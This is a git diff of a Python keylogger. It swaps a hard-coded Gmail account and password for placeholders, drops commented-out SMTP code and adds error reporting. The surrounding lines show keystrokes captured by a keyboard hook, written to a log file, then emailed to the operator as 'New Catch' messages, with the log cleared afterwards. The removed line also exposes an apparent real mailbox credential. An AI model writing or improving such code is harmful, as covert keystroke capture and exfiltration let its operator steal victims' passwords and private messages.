@@ -20,7 +20,7 @@ def Send_Email():
         data = f'Message: catch {date} - {data}'
         print(data)
         body = f
-        Create_Email('v4lr0t.keylog@gmail.com', 'Testing*1234', 'v4lr0t.keylog@gmail.com', f'New Catch: {date}', data)
+        Create_Email('usuario@gmail.com', 'Clave', 'usuariog@gmail.com', f'New Catch: {date}', data)
         f.seek(0)
         f.truncate()
 
@@ -43,15 +43,9 @@ def Create_Email(user, passw, recept, subj, body):
             server.sendmail(From, To, Email)
             
         server.close()
-        # server = smtplib.SMTP("smtp.gmail.com:587")
-        # server.ehlo()
-        # server.starttls()
-        # server.login(mailUser, mailPass)
-        # server.sendmail(From, To, Email)
-        # server.close()
         print("Email sent successfully")
-    except:
-        print("Error sending email")
+    except Exception as e:
+        print(f"Error sending email, error: {e}")
 
 def OnKeyboardEvent(event):
     logging.basicConfig(filename=dir_destination, level=logging.DEBUG, format='%(message)s')
